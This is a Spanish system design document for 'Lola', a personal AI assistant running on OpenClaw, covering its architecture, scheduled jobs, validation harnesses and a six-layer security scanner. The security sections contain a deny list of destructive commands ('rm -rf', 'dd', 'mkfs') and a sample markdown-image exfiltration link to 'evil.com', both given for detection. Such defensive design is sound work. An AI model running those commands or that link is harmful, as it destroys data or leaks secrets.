# System Design Document (SDD)
## Lola — Asistente Personal IA 24/7

**Versión:** 1.0  
**Fecha:** 2026-03-24  
**Owner:** Lola (lolaopenclaw@gmail.com)  
**Estado:** Producción activa

---

## 1. Arquitectura del Sistema

### 1.1 Vista de Alto Nivel

```
┌─────────────────────────────────────────────────────────────────────┐
│                          USUARIO (Manu)                             │
│                                                                     │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐            │
│  │   Telegram   │  │   Discord    │  │  Laptop SSH  │            │
│  │  (Primary)   │  │  (Reports)   │  │    (Dev)     │            │
│  └──────┬───────┘  └──────┬───────┘  └──────┬───────┘            │
│         │                  │                  │                     │
└─────────┼──────────────────┼──────────────────┼─────────────────────┘
          │                  │                  │
          │         INTERNET │                  │ Tailscale VPN
          │                  │                  │
┌─────────▼──────────────────▼──────────────────▼─────────────────────┐
│                    VPS Ubuntu 24.04 LTS                             │
│                   16GB RAM, 8 cores, SSD                            │
│                                                                     │
│  ┌───────────────────────────────────────────────────────────────┐ │
│  │              OpenClaw Gateway (puerto 18790)                  │ │
│  │                     systemd service                           │ │
│  │                                                               │ │
│  │  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐         │ │
│  │  │   Channel   │  │   Channel   │  │   Channel   │         │ │
│  │  │  Telegram   │  │   Discord   │  │     CLI     │         │ │
│  │  └──────┬──────┘  └──────┬──────┘  └──────┬──────┘         │ │
│  │         │                 │                 │                │ │
│  │         └─────────────────┴─────────────────┘                │ │
│  │                           │                                   │ │
│  │                  ┌────────▼────────┐                         │ │
│  │                  │  Agent Router   │                         │ │
│  │                  │  (Main Agent)   │                         │ │
│  │                  └────────┬────────┘                         │ │
│  │                           │                                   │ │
│  │         ┌─────────────────┼─────────────────┐               │ │
│  │         │                 │                 │               │ │
│  │    ┌────▼────┐     ┌─────▼─────┐    ┌─────▼─────┐         │ │
│  │    │ Session │     │  Subagent │    │   Cron    │         │ │
│  │    │  Main   │     │  Pool     │    │ Scheduler │         │ │
│  │    │ (Opus)  │     │  (1-5)    │    │  (20+)    │         │ │
│  │    └────┬────┘     └─────┬─────┘    └─────┬─────┘         │ │
│  │         │                 │                 │               │ │
│  └─────────┼─────────────────┼─────────────────┼───────────────┘ │
│            │                 │                 │                  │
│  ┌─────────▼─────────────────▼─────────────────▼───────────────┐ │
│  │                     Workspace                                │ │
│  │              ~/.openclaw/workspace/                          │ │
│  │                                                              │ │
│  │  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐  │ │
│  │  │  Memory  │  │ Scripts  │  │  Skills  │  │  Agents  │  │ │
│  │  │   (MD)   │  │ (1200+)  │  │  (54)    │  │   (5)    │  │ │
│  │  └──────────┘  └──────────┘  └──────────┘  └──────────┘  │ │
│  │                                                              │ │
│  │  SOUL.md | USER.md | AGENTS.md | TOOLS.md | PROJECTS.md    │ │
│  └──────────────────────────────────────────────────────────────┘ │
│                                                                     │
│  ┌───────────────────────────────────────────────────────────────┐ │
│  │                    Harness Layer                              │ │
│  │                                                               │ │
│  │  [API Health] [Rate Limit] [Config Drift] [Cron Validator]  │ │
│  │  [Subagent Validator] [Security Scanner 6-layer]            │ │
│  └───────────────────────────────────────────────────────────────┘ │
└─────────────────────────────────────────────────────────────────────┘
                              │
                    ┌─────────┴─────────┐
                    │                   │
          ┌─────────▼────────┐  ┌──────▼──────────┐
          │  External APIs   │  │    Storage      │
          │                  │  │                 │
          │ • Anthropic      │  │ • Google Drive  │
          │ • Google Gemini  │  │ • GitHub        │
          │ • Telegram Bot   │  │   (repos)       │
          │ • Discord Bot    │  │                 │
          │ • Garmin Connect │  │                 │
          │ • Brave Search   │  │                 │
          │ • GitHub API     │  │                 │
          └──────────────────┘  └─────────────────┘
```

### 1.2 Flujo de Datos: Mensaje Entrante

```
Usuario (Telegram)
    ↓
[1] Telegram Bot API recibe mensaje
    ↓
[2] OpenClaw Gateway (Channel Telegram)
    ↓
[3] Verifica quiet hours (00:00-07:00)
    │ ├─ Si quiet → Drop (excepto emergencias)
    │ └─ Si activo → Continúa
    ↓
[4] Detecta driving mode triggers
    │ ├─ "estoy en el coche" → Activa TTS
    │ └─ "ya estoy en casa" → Desactiva TTS
    ↓
[5] Agent Router crea sesión Main
    ↓
[6] Main Agent (Opus 4.5)
    │ ├─ Lee: SOUL.md, USER.md, AGENTS.md
    │ ├─ Lee: memory/2026-03-24.md (hoy)
    │ ├─ Lee: memory/pending-actions.md
    │ └─ Construye contexto (200K tokens)
    ↓
[7] Procesa mensaje
    │ ├─ Si tarea <5 min → Ejecuta directamente
    │ └─ Si tarea >5 min → Spawns subagent
    ↓
[8] Genera respuesta
    ↓
[9] Harness Layer (Outbound)
    │ ├─ PII Scanner (secrets, emails, paths)
    │ ├─ Redaction Pipeline (API keys, tokens)
    │ └─ Aprueba → Continúa
    ↓
[10] Envía respuesta
    │ ├─ Si driving mode → TTS (Google 1.25x)
    │ └─ Si normal → Text
    ↓
[11] Actualiza memoria
    │ ├─ Append memory/2026-03-24.md
    │ ├─ Actualiza memory/learnings.md (si aprendió)
    │ └─ Actualiza memory/decisions.md (si decidió)
    ↓
Usuario recibe respuesta
```

### 1.3 Flujo de Datos: Heartbeat / Cron

```
Cron Scheduler (cada cron tiene schedule cron-like o interval)
    ↓
[1] Verifica schedule (ej. 10:00 AM daily)
    ↓
[2] Verifica si quiet hours → Skip si no crítico
    ↓
[3] Spawns agentTurn con payload específico
    │ ├─ model: Haiku / Sonnet según cron
    │ ├─ timeout: 300-900s según complejidad
    │ └─ payload: {message, context, files}
    ↓
[4] Agente ejecuta tarea
    │ ├─ Ejecuta script (ej. garmin-health-report.sh)
    │ ├─ Consulta APIs (Garmin, Google, etc.)
    │ └─ Procesa datos
    ↓
[5] Valida resultado
    │ ├─ ¿Exit code 0? → Success
    │ └─ ¿Exit code >0? → Retry (max 3, backoff exponencial)
    ↓
[6] Logea resultado
    │ ├─ Success → Log memory/cron-success-YYYY-MM-DD.log
    │ └─ Failure → Log memory/cron-failure-YYYY-MM-DD.log
    ↓
[7] Notifica si necesario
    │ ├─ Success routine → No notifica
    │ ├─ Failure critical → Telegram alert
    │ └─ Warning → Discord report (morning brief)
    ↓
[8] Actualiza memoria
    │ └─ Append memory/2026-03-24.md (si relevante)
    ↓
Espera próximo schedule
```

### 1.4 Flujo de Datos: Subagent Spawn

```
Main Agent decide delegar tarea
    ↓
[1] Evalúa criterios delegación
    │ ├─ ¿Tarea >5 min? ✓
    │ ├─ ¿Independiente? ✓
    │ ├─ ¿No requiere decisiones humanas? ✓
    │ └─ ¿<5 subagents activos? ✓ → Continúa
    ↓
[2] Construye task description
    │ ├─ Objetivo claro
    │ ├─ Contexto necesario
    │ ├─ Entregables específicos
    │ └─ Tiempo estimado
    ↓
[3] Spawns subagent
    │ ├─ model: Sonnet 4.5 (si complejo) / Flash (si simple)
    │ ├─ depth: 1 (no nested)
    │ ├─ timeout: según estimación
    │ └─ session_id: agent:main:subagent:<uuid>
    ↓
[4] Subagent trabaja (asíncrono)
    │ ├─ Lee archivos necesarios
    │ ├─ Ejecuta comandos
    │ ├─ Genera output
    │ └─ Escribe deliverables a disco
    ↓
[5] Subagent completa
    │ ├─ Marca session como ended
    │ └─ Escribe transcript completo
    ↓
[6] Harness: Subagent Validator (si crítico)
    │ ├─ Fase 1: Structural (secrets, syntax, paths)
    │ ├─ Fase 2: Semantic (AI reviewer)
    │ └─ Fase 3: Threshold (auto-apply vs flag)
    ↓
[7] Auto-announce a Main Agent (push)
    │ └─ "Subagent X completó: [resumen]"
    ↓
[8] Main Agent procesa resultado
    │ ├─ Si approved → Aplica cambios
    │ ├─ Si flagged → Pide review a Manu
    │ └─ Si rejected → Notifica error
    ↓
Main Agent continúa con siguiente tarea
```

---

## 2. Componentes del Sistema

### 2.1 OpenClaw Gateway

**Responsabilidad:** Orquestador central del sistema

**Tecnología:**
- Runtime: Node.js v25.8.1
- Puerto: 18790 (localhost only, acceso via Tailscale)
- Service: systemd (auto-restart on crash)
- Configuración: ~/.openclaw/openclaw.json

**Funciones:**
1. Recibe mensajes de canales (Telegram, Discord, CLI)
2. Routing a agentes (main, subagents, crons)
3. Gestión de sesiones (context, state)
4. Scheduling de crons (cron-like + interval)
5. Harness orchestration (pre/post processing)

**Configuración crítica:**
```json
{
  "gateway": {
    "bind": "127.0.0.1:18790",
    "workspace": "~/.openclaw/workspace"
  },
  "agents": {
    "main": {
      "model": "anthropic/claude-opus-4-5",
      "maxTokens": 200000
    },
    "defaults": {
      "model": "anthropic/claude-haiku-4-5",
      "imageGenerationModel": {
        "primary": "google/gemini-2-5-flash-preview"
      }
    }
  },
  "channels": {
    "telegram": {
      "enabled": true,
      "chatId": "<REDACTED>",
      "quietHours": {
        "start": "00:00",
        "end": "07:00",
        "timezone": "Europe/Madrid"
      }
    },
    "discord": {
      "enabled": true,
      "channelId": "<REDACTED>"
    }
  }
}
```

### 2.2 Canales de Comunicación

#### Telegram (Primary)

**Plugin:** `@openclaw/plugins-channel-telegram`  
**Modo:** Bidireccional (recibe + envía)  
**Features:**
- Inline buttons (confirmaciones, opciones)
- Text formatting (Markdown)
- File attachments (PDFs, images, logs)
- Reactions (MINIMAL mode: 1 cada 5-10 mensajes)

**Configuración:**
```json
{
  "telegram": {
    "token": "<REDACTED>",
    "chatId": 6884477,
    "quietHours": {
      "start": "00:00",
      "end": "07:00"
    },
    "reactions": "minimal"
  }
}
```

#### Discord (Reports)

**Plugin:** `@openclaw/plugins-channel-discord`  
**Modo:** Principalmente output (reports consolidados)  
**Features:**
- Rich embeds (títulos, colores, fields)
- Channel targeting (#📊-reportes-matutino)
- Thread support (para reports largos)

**Uso principal:**
- Informe matutino (10:00 AM)
- Security audit reports (lunes 9:00 AM)
- Cron failure summaries (si múltiples fallos)

#### CLI (Dev/Debug)

**Plugin:** Core OpenClaw  
**Modo:** Interactivo via SSH (laptop en horario laboral)  
**Comandos principales:**
```bash
openclaw status
openclaw cron list
openclaw cron update <id> --model <model>
openclaw sessions list
openclaw sessions log <id>
subagents-dashboard  # TUI blessed
```

### 2.3 Agentes

#### Main Agent (Session Principal)

**Model:** `anthropic/claude-opus-4-5`  
**Context:** 200K tokens  
**Rol:** Interacción directa con Manu  
**Lifecycle:** Long-running (persiste entre mensajes)

**Carga inicial cada sesión:**
1. `SOUL.md` — Personalidad, tono, principios
2. `USER.md` — Perfil de Manu
3. `AGENTS.md` — Reglas de sesión
4. `TOOLS.md` — Herramientas locales
5. `PROJECTS.md` — Proyectos activos
6. `MEMORY.md` — Índice de memoria
7. `memory/2026-03-24.md` — Daily log (hoy)
8. `memory/2026-03-23.md` — Daily log (ayer)
9. `memory/pending-actions.md` — Acciones pendientes

**Responsabilidades:**
- Responder a Manu (conversación)
- Decidir cuándo delegar (subagents)
- Actualizar memoria después de cada sesión
- Coordinar subagents (monitoring, resultados)
- Ejecutar tareas cortas (<5 min) directamente

#### Subagents (Workers)

**Pool size:** Hasta 5 en paralelo  
**Depth:** Máximo 1 (no nested)  
**Models:** Según complejidad
- Sonnet 4.5 → Tasks complejas (coding, research profundo)
- Flash 3 → Tasks simples (verificación, bulk)

**Criterios de spawn:**
- Tarea >5 min
- Independiente (no requiere contexto conversacional)
- No requiere decisiones humanas en medio
- Paralelizable

**Lifecycle:**
1. Spawn con task description clara
2. Trabaja asíncronamente
3. Escribe deliverables a disco
4. Marca session ended
5. Auto-announce a Main Agent (push)

**Monitoring:**
```bash
# TUI dashboard (tiempo real)
subagents-dashboard

# CLI status
subagents list
subagents status <id>
subagents log <id>
```

**Validación output (si crítico):**
- Fase 1: Structural (git-secrets, syntax check, path validation)
- Fase 2: Semantic (AI reviewer evalúa correctness, safety, quality)
- Fase 3: Threshold decision (auto-apply >8.5/10, flag 6-8.4, reject <6)

#### Cron Agents (Scheduled)

**Total activo:** ~28 crons  
**Models:** Mix Haiku/Sonnet según criticidad

**Categorías:**

**System & Infrastructure (Haiku):**
- `🔄 Model Reset Nightly` — 00:00 (verifica config model)
- `🔄 System Updates Nightly` — 01:30 (apt update + upgrade)
- `config-drift-check` — 02:00 (compara config vs baseline)
- `nightly-security-review` — 04:00 (permissions, secrets scan, logs)
- `🧠 Memory Search Reindex` — 04:30 (Ollama reindex)
- `🔄 Auto-update OpenClaw` — 21:30 (check releases, auto-update)
- `🏠 Driving Mode Auto-Reset` — 22:00 (reset driving mode state)

**Autoimprove (Haiku, timeout 900s):**
- `🔬 Autoimprove Scripts Agent` — 03:00 (optimiza scripts/)
- `🔬 Autoimprove Skills Agent` — 03:05 (optimiza skills/)
- `🔬 Autoimprove Memory Agent` — 03:10 (consolida memory/)

**Backup & Validation (Haiku):**
- `Backup diario de memoria` — 04:00 (compress + upload Google Drive)
- `📋 Backup validation (weekly)` — Domingo 04:00 (verifica integridad)
- `🗑️ Backup retention cleanup` — Lunes 04:00 (elimina >30 días)

**Health & Monitoring (Sonnet):**
- `🏃 Resumen Semanal de Actividades Garmin` — Domingo 09:00 (análisis semanal)
- `healthcheck:fail2ban-alert` — Every 6h (security alerts)
- `healthcheck:rkhunter-scan-weekly` — Lunes 09:00 (rootkit scan)
- `healthcheck:lynis-scan-weekly` — Lunes 09:00 (security audit)
- `healthcheck:security-audit-weekly` — Lunes 09:00 (consolidado)

**Daily Operations:**
- `🌊 Surf Conditions Daily` — 06:00 (Haiku, scrape Zarautz/Mundaka)
- `🌅 Log Review Matutino` — 07:30 (Haiku, revisa logs 24h)
- `📊 Populate Google Sheets v2` — 09:30 (Sonnet, finanzas sync)
- `📋 Informe Matutino` — 10:00 (Sonnet, consolidado Discord)

**Maintenance:**
- `🧹 Cleanup audit semanal` — Domingo 22:00 (Haiku, /tmp cleanup)
- `memory-decay-weekly` — Domingo 23:00 (Haiku, Hot/Warm/Cold tiers)
- `🧠 Memory Guardian Pro` — 00:00 (Haiku, limpieza automática)
- `🔧 Lola Toolkit Sync Check` — Lunes 10:00 (Haiku, compare repos)
- `🔬 Seguimiento Autoresearch` — Lunes 10:00 (Haiku, track GitHub changes)
- `🔔 OpenClaw release check` — Lunes/Jueves 10:00 (Haiku, compare versions)
- `🚗 Driving Mode Review` — Viernes 10:00 (Haiku, busca mejoras)
- `security:rotate-gateway-token` — Trimestral Q2 (Haiku, auto-rotate)

**Espaciado crítico:**
- Autoimprove agents: 03:00, 03:05, 03:10 (5 min apart)
- Backup → Reindex: 04:00 → 04:30 (30 min apart)
- Security audits: 09:00 (todos juntos OK, solo lunes)

### 2.4 Arneses de Validación

#### 1. API Health Checker

**Script:** `scripts/api-health-checker.py`  
**Cron:** Every 30 min (critical APIs), 2h (high), daily (all)  
**Model:** N/A (script directo)

**APIs monitoreadas:**
- Anthropic (Claude) — CRITICAL
- Google (Gemini, Drive, Gmail, Calendar) — HIGH
- Telegram — CRITICAL
- GitHub — MEDIUM
- Garmin Connect — MEDIUM
- Brave Search — MEDIUM

**Health check:**
1. Connectivity test (curl con timeout 10s)
2. Auth validation (test request real)
3. Latency measurement (<5s threshold)
4. Response schema validation (opcional)

**Decisión automática:**
- ≥2 APIs failed → Alert Telegram
- Critical API down → Failover (Anthropic → Google)
- Latency >5s → Warning (log only)

**Output:** `memory/api-health-YYYY-MM-DD.json`

#### 2. Rate Limit Monitor

**Script:** `scripts/rate-limit-monitor.py`  
**Cron:** Hourly (tracking) + Daily 20:00 (alert check)  
**Model:** N/A

**Quotas trackeadas:**
- Anthropic: No limit public, pero track spending ($50/month budget)
- Google Gemini: 1500 RPD (free tier)
- Brave Search: 2000/month (free tier)
- OpenAI (Whisper): Track usage (budget $15/month)

**Tracking file:** `memory/api-usage-tracking.json`

**Alerts:**
- Daily quota >80% → Warning
- Monthly budget >80% → Warning
- Quota exceeded → Alert + suggest action (reduce usage, upgrade plan)

#### 3. Config Drift Detector

**Script:** `scripts/config-drift-detector.py`  
**Cron:** Daily 02:00  
**Model:** N/A

**Compara:**
- `~/.openclaw/openclaw.json` vs `memory/config-golden-snapshot.json`
- `.openclaw/.env` vs expected vars

**Detecta:**
- Manual edits no documentados
- Merge conflicts mal resueltos
- Corruption (rare)
- Missing env vars

**Output:** `memory/config-drift-YYYY-MM-DD.log`

**Decisión:**
- Drift detected → Prompt para aceptar como new baseline o revertir

#### 4. Cron Validator

**Script:** `scripts/cron-validator.py`  
**Hook:** Git pre-commit (when `cron/jobs.json` changes)  
**Model:** N/A

**Validaciones:**
1. Schedule syntax (cron expression o interval)
2. Script existence & permissions (+x)
3. Dependency resolution (comandos disponibles)
4. Dry-run execution (si script soporta `--dry-run`)
5. Historical comparison (schedule changed?)

**Decisión:**
- Critical error → Block commit
- Warning → Prompt user (allow with confirmation)
- Success → Allow commit

#### 5. Subagent Output Validator

**Script:** `scripts/subagent-validator.py`  
**Trigger:** Después de subagent completion (si tarea crítica)  
**Model:** Sonnet 4.5 (reviewer)

**Pipeline 3 fases:**

**Fase 1: Structural (determinístico, <500ms):**
- Secrets scanner (git-secrets + trufflehog)
- Dangerous commands (`rm -rf`, `dd`, `mkfs`, `>\/dev`)
- Syntax validation (bash -n, python -m py_compile, jq)
- Path validation (dentro de workspace?)
- Dependency check (imports disponibles?)

**Fase 2: Semantic (AI reviewer, 2-5s):**
- Prompt: "Evalúa correctness, safety, quality, completeness (1-10)"
- Input: Original task + subagent output + relevant files
- Output: Scores + issues + recommendation

**Fase 3: Threshold:**
- Score ≥8.5 + Safety ≥9 → Auto-apply + log
- Score 7-8.4 + Safety ≥8 → Auto-apply + notify (no blocking)
- Score 6-6.9 + Safety ≥7 → Flag for review (Telegram)
- Score <6 or Safety <7 → Reject + notify

**Output:** `memory/subagent-validation-<id>.json`

#### 6. Security Scanner (6 capas, Berman architecture)

**Script:** `scripts/security-scanner.py`  
**Cron:** `nightly-security-review` (04:00 daily)  
**Model:** Sonnet 4.5 (solo para análisis logs)

**Layer 1: Deterministic Sanitization (11 steps)**
- Invisible Unicode stripping
- Wallet draining chars detection
- Lookalike normalization (~40 pairs)
- Token budget enforcement
- Combining marks cleanup
- Base64/hex hidden instruction detection
- Statistical anomaly detection
- Role markers/jailbreak patterns
- Code block stripping
- Hard character limit fallback
- Returns stats for quarantine

**Layer 2: Frontier Scanner (LLM-based)**
- Dedicated classification LLM (strongest model)
- Structured JSON: verdict, risk 0-100, categories, reasoning
- Review >35, block >70 (configurable)
- Fail closed (high-risk) vs fail open (low-risk)

**Layer 3: Outbound Content Gate**
- Secrets/API keys patterns
- Injection artifacts
- Data exfiltration (markdown images: `![](evil.com?data=SECRET)`)
- Financial data leaks
- Internal file paths

**Layer 4: Redaction Pipeline**
- API keys/tokens (8 formats)
- Personal emails
- Phone numbers
- Dollar amounts
- Single pipeline before outbound

**Layer 5: Runtime Governance**
- Spend limit: $5 warn / $15 cap in 5-min window
- Volume limit: 200 calls/10min global, per-caller overrides
- Lifetime limit: 300 calls/process (loop stopper)
- Duplicate detection: prompt hash cache

**Layer 6: Access Control**
- Path guards: deny list (.env, credentials, SSH keys)
- Directory containment (follow symlinks)
- URL safety: only http/https, block private ranges
- DNS rebinding protection

**Output:** `memory/security-scan-YYYY-MM-DD.json`

### 2.5 Skills (54 total)

**Globales (38, npm-installed):**
- `1password`, `blogwatcher`, `blucli`, `camsnap`, `clawhub`
- `coding-agent`, `eightctl`, `gemini`, `gh-issues`, `gifgrep`
- `github`, `gog` (Google Workspace), `healthcheck`, `himalaya` (email)
- `mcporter` (MCP servers), `nano-pdf`, `node-connect`, `obsidian`
- `openai-whisper`, `openhue`, `oracle`, `ordercli`, `sag` (TTS)
- `session-logs`, `skill-creator`, `songsee`, `spotify-player`, `tmux`
- `wacli` (WhatsApp), `weather`
- (+ 13 más no listados aquí)

**Locales (16, workspace):**
- `api-health`, `rate-limit`, `config-drift`, `cron-validator`, `subagent-validator`
- `autoimprove`, `proactive-agent`, `clawdbot-security-check`
- `openclaw-checkpoint`, `pr-review`, `truthcheck`
- `verification-before-completion`, `video-frames`, `youtube-smart-transcript`
- `sonoscli`, `(otros 1+)`

**Más usados:**
- `github` (issues, PRs, CI)
- `gog` (Gmail, Calendar, Drive, Sheets)
- `coding-agent` (delegación a Codex/Claude Code)
- `weather` (wttr.in / Open-Meteo)
- `healthcheck` (auditorías seguridad)

### 2.6 Scripts (1200+ archivos)

**Categorías principales:**

**Arneses & Monitoring (9):**
- `api-health-checker.py` (25KB)
- `rate-limit-monitor.py` (12KB)
- `rate-limit-status` (dashboard ASCII)
- `config-drift-detector.py` (8KB)
- `subagents-dashboard` (TUI blessed)
- `subagent-validator.py` (19KB)
- `validate-subagent-output` (wrapper)
- `gateway-health-check.sh`
- `pre-restart-validator.sh`

**Garmin & Health (5):**
- `garmin-health-report.sh`
- `garmin-activities-to-sheets.py`
- `garmin-activities-historical.py`
- `garmin-json-export.sh`
- `health-alerts.sh`

**Finanzas (1):**
- `sheets-populate-v2.py` (actualización Google Sheets)

**GitHub (2):**
- `pr-reviewer.sh`
- `monitor-github-24586-robust.sh`

**Surf (1):**
- `surf-conditions.sh` (Zarautz/Mundaka scraper)

**Backups & Validation (4):**
- `backup-validator.sh`
- `post-commit-backup.sh`
- `restore.sh`
- `verify.sh`

**Autoresearch (2):**
- `autoimprove-trigger.sh`
- `track-autoresearch.sh`

**System (7):**
- `apt-security-check.sh`
- `bootstrap.sh`
- `usage-report.sh`
- `calendar-tasks.sh`
- `dashboard-api-server.js`
- `security-scanner.py`
- (+ otros)

**TTS & Audio:**
- `google-tts.sh`
- `scripts/tts-venv/` (Python venv: edge-tts, gtts-cli)

### 2.7 Memoria (Estructura)

**Raíz workspace:**
```
SOUL.md         — Personalidad, tono, principios
USER.md         — Perfil de Manu
AGENTS.md       — Reglas de sesión
TOOLS.md        — Herramientas locales
PROJECTS.md     — Proyectos activos
MEMORY.md       — Índice de memoria
IDENTITY.md     — Identidad (FEMENINO)
PRD.md          — Este documento
```

**memory/ (estructura):**
```
memory/
├── YYYY-MM-DD.md                  — Daily logs (cronológico)
├── learnings.md                   — Lecciones aprendidas (temático)
├── decisions.md                   — Decisiones técnicas (con razones)
├── preferences.md                 — Preferencias de Manu
├── protocols.md                   — Protocolos operacionales
├── pending-actions.md             — Acciones pendientes (TODO)
│
├── entities/                      — Knowledge graph (PARA)
│   ├── areas/
│   │   ├── people/
│   │   │   ├── manu.json          — Facts atómicos sobre Manu
│   │   │   └── manu.md            — Summary auto-generado
│   │   └── companies/
│   ├── projects/
│   │   ├── surf-coach.json
│   │   └── finanzas.json
│   └── resources/
│       └── tools/
│
├── finanzas/                      — Finanzas tracking
│   ├── movimientos-2026.md
│   ├── resumen-mensual-2026.md
│   ├── categorias.md
│   └── setup.md
│
├── garmin/                        — Health data
│   ├── README.md
│   ├── historico-2026.md
│   ├── tendencias.md
│   ├── resumen-semanal/
│   │   ├── 2026-w11.md
│   │   └── 2026-w12.md
│   └── VERIFICACION-MIGRACION.md
│
├── health/                        — Health instructions
│   ├── agent-instructions.md
│   ├── manu-health-profile.md
│   └── weekly-patterns.md
│
├── harness-weekly-review-YYYY-MM-DD.md  — Rolling latest
│
├── youtube-*.md                   — YouTube analysis (14 use cases)
│
├── model-strategy.md              — Multi-model strategy
├── delegation-strategy.md         — Cuándo delegar subagents
├── advanced-harness-research.md   — Harness engineering research
├── berman-security-article.md     — 6-layer security architecture
│
├── driving-mode-state.json        — Driving mode state
├── driving-mode-protocol.md       — Driving mode docs
├── driving-mode-improvements.md   — Mejoras propuestas
│
├── api-health-YYYY-MM-DD.json     — API health logs
├── api-usage-tracking.json        — Rate limit tracking
├── config-drift-YYYY-MM-DD.log    — Config drift logs
├── cron-success-YYYY-MM-DD.log    — Cron success logs
├── cron-failure-YYYY-MM-DD.log    — Cron failure logs
├── security-scan-YYYY-MM-DD.json  — Security scan results
│
└── ...                            — (100+ archivos más)
```

**Principios memoria:**
1. **One source of truth** — Cada pieza de conocimiento tiene exactamente un canonical home
2. **Git-friendly** — Markdown + JSON, diff-able, versionable
3. **Human-readable** — Lola puede leer sus propios archivos
4. **Agent-first** — Diseñado para ser consumido por IA, no solo humanos
5. **Conserve first** — Cambios estructurales evalúan impacto en archivos existentes

**Memory decay (semanal):**
- **Hot:** <7 días, acceso frecuente → Mantener en raíz
- **Warm:** 7-30 días, acceso ocasional → Mover a memory/archive/
- **Cold:** >30 días, acceso raro → Comprimir a memory/archive/YYYY-MM.tar.gz

---

## 3. Flujos de Datos Principales

### 3.1 Mensaje Entrante → Procesamiento → Respuesta

**Ver Sección 1.2** (ya cubierto)

### 3.2 Heartbeat → Checks → HEARTBEAT_OK o Alerta

```
[Trigger: Cron daily 10:00 AM]
    ↓
[1] Ejecuta health checks
    ├─ Gateway status (puerto 18790 listening?)
    ├─ Disk space (>10GB libre?)
    ├─ Memory usage (<80%?)
    ├─ API health (último check <1h?)
    └─ Cron success rate (>90% últimas 24h?)
    ↓
[2] Evalúa resultado
    ├─ All passed → HEARTBEAT_OK (log only)
    ├─ Warning (1-2 checks failed) → Discord report
    └─ Critical (≥3 checks failed) → Telegram alert
    ↓
[3] Si critical, sugiere remediación
    ├─ Disk space low → "Ejecutar cleanup-audit.sh"
    ├─ API down → "Verificar status.anthropic.com"
    └─ Cron failures → "Revisar memory/cron-failure-*.log"
    ↓
[4] Actualiza memoria
    └─ Append memory/heartbeat-log.md
```

### 3.3 Cron → Ejecución → Log/Notificación

**Ver Sección 1.3** (ya cubierto)

### 3.4 Subagent Spawn → Trabajo → Completion Announce

**Ver Sección 1.4** (ya cubierto)

---

## 4. Decisiones de Diseño

### 4.1 ¿Por qué Markdown y no Sheets? (Agent First)

**Decisión:** Memoria en Markdown/JSON, no Google Sheets

**Razones:**
1. **Agent-first:** Lola puede leer/escribir archivos directamente sin API calls
2. **Git-friendly:** Diff-able, versionable, mergeable
3. **Human-readable:** Manu puede editar con cualquier editor
4. **Offline-capable:** No requiere internet para acceder
5. **No vendor lock-in:** Plain text, portable
6. **Búsqueda rápida:** `rg`, `grep`, `jq` son instantáneos
7. **Backup simple:** Copy files, no export/import

**Trade-off:**
- ❌ No queries complejas (no SQL)
- ❌ No visualización gráfica (no charts nativos)
- ✅ Pero: Simplicidad > Features para este caso de uso

**Excepción:** Finanzas usa Sheets porque:
- Manu ya usa Sheets para visualizar
- Fórmulas de categorización automáticas
- Compartir con otros (contador, familia)

### 4.2 ¿Por qué blessed para TUI (no textual, no ink)?

**Decisión:** Usar blessed (Node.js) para TUIs

**Razones:**
1. **Maduro:** Framework desde 2015, estable
2. **Sin deps nativas:** Pure JS, portable
3. **Buena documentación:** Ejemplos claros, API completa
4. **Usado en producción:** yeoman, slap, otros proyectos populares
5. **Widget library rica:** box, list, table, form, scrollbar, layout
6. **Integrado con OpenClaw:** Mismo stack (Node.js), fácil importar

**Alternativas descartadas:**
- **Textual (Python):** Requiere cambiar stack, menos integrado con OpenClaw
- **Ink (React):** Overhead innecesario, abstracción pesada para TUIs
- **ANSI crudo:** Reinventar la rueda, tedioso

**Ejemplo (subagents-dashboard):**
```javascript
const blessed = require('blessed');
const screen = blessed.screen({smartCSR: true});
const box = blessed.box({
  top: 0, left: 0,
  width: '100%', height: '100%',
  content: 'Subagents Dashboard',
  tags: true, border: {type: 'line'},
  style: {fg: 'white', border: {fg: '#f0f0f0'}}
});
screen.append(box);
screen.render();
```

### 4.3 ¿Por qué 6 capas de seguridad? (Berman architecture)

**Decisión:** Implementar 6 capas de defensa (Berman article)

**Razones:**
1. **Defense in depth:** Si una capa falla, otras compensan
2. **Diferentes vectores:** Cada capa protege contra ataques distintos
3. **Proven pattern:** Usado en producción por Anthropic, OpenAI, otros
4. **Independencia:** Layers no dependen unas de otras
5. **Escalable:** Añadir más capas sin reescribir existentes

**Costo:**
- ❌ Latencia +500ms (sanitización + scanner)
- ❌ Complejidad (6 componentes que mantener)
- ✅ Pero: Security > speed para acciones externas

**Filosofía:** "No single layer is enough, independence is the point"

### 4.4 ¿Por qué Sonnet para subagents y Haiku para crons?

**Decisión:** Multi-model strategy (Opus/Sonnet/Haiku/Flash)

**Razones:**
1. **Optimización coste:** Haiku 13x más barato que Opus
2. **Right tool for the job:** Crons rutinarios no necesitan Opus
3. **Escalabilidad:** Más crons sin explotar presupuesto
4. **Calidad suficiente:** Haiku es excelente para tareas mecánicas

**Evidencia empírica:**
- 4 subagents (Flash) completaron verificación de scripts complejos (16-25KB) sin problemas
- Crons Haiku (20+) tienen success rate >95%
- Solo 6 crons necesitan Sonnet (seguridad, Sheets, Garmin analysis)

**Coste mensual:**
- Haiku crons: $9/mes (15 crons)
- Sonnet crons: $14.40/mes (6 crons)
- Total crons: $23.40/mes
- **Saving vs all-Opus:** ~$80/mes

**Ver:** `memory/model-strategy.md` para decision tree completo

---

## 5. Seguridad

### 5.1 Las 6 Capas (Berman Architecture)

**Ver Sección 2.6: Security Scanner** (ya cubierto en detalle)

**Resumen:**
1. Deterministic Sanitization (11 steps)
2. Frontier Scanner (LLM-based, block >70)
3. Outbound Content Gate (secrets, PII)
4. Redaction Pipeline (8 formats)
5. Runtime Governance (spend/volume/duplicate limits)
6. Access Control (paths, URLs, DNS)

### 5.2 Nightly Security Review

**Cron:** `nightly-security-review` (04:00 daily)  
**Script:** `scripts/security-scanner.py`  
**Model:** Sonnet 4.5 (solo para análisis logs)

**Checks:**
1. **File permissions** — 644 para archivos, 755 para dirs, 600 para secrets
2. **Gateway settings** — Bind 127.0.0.1 (no 0.0.0.0), tokens válidos
3. **Secrets in version control** — Busca en commits recientes (git log -p)
4. **Security module tampering** — Hash de security-scanner.py unchanged?
5. **Suspicious log entries** — Patrón de: repeated failures, unusual commands, auth attempts
6. **Cross-reference findings** — Compara con codebase, detecta inconsistencias

**Output:** `memory/security-scan-YYYY-MM-DD.json`

**Alert si:**
